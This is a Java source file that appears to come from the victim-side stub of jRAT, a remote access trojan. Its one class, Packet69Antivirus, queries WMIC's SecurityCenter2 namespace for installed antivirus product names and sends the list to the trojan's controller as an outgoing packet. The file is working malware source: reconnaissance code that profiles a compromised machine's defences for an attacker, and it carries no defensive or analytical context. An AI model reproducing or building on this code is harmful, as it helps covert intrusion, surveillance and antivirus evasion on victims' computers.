package pro.jrat.stub.packets.outgoing;

import java.io.BufferedReader;
import pro.jrat.stub.utils.*;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import pro.jrat.common.io.StringWriter;

public class Packet69Antivirus extends AbstractOutgoingPacket {
	
	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
		List<String> antiviruses = new ArrayList<String>();
		
		try {
			Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/Node:localhost", "/Namespace:\\\\root\\SecurityCenter2", "Path", "AntiVirusProduct", "Get", "/Format:List" });
			
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			
			String line;
			
			while ((line = reader.readLine()) != null) {
				if (line.trim().startsWith("displayName")) {
					antiviruses.add(line.trim().split("=")[1]);
				}
			}
			
			reader.close();		
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		dos.writeInt(antiviruses.size());
		
		for (int i = 0; i < antiviruses.size(); i++) {
			sw.writeLine(antiviruses.get(i));
		}
	}

	@Override
	public byte getPacketId() {
		return 69;
	}

}
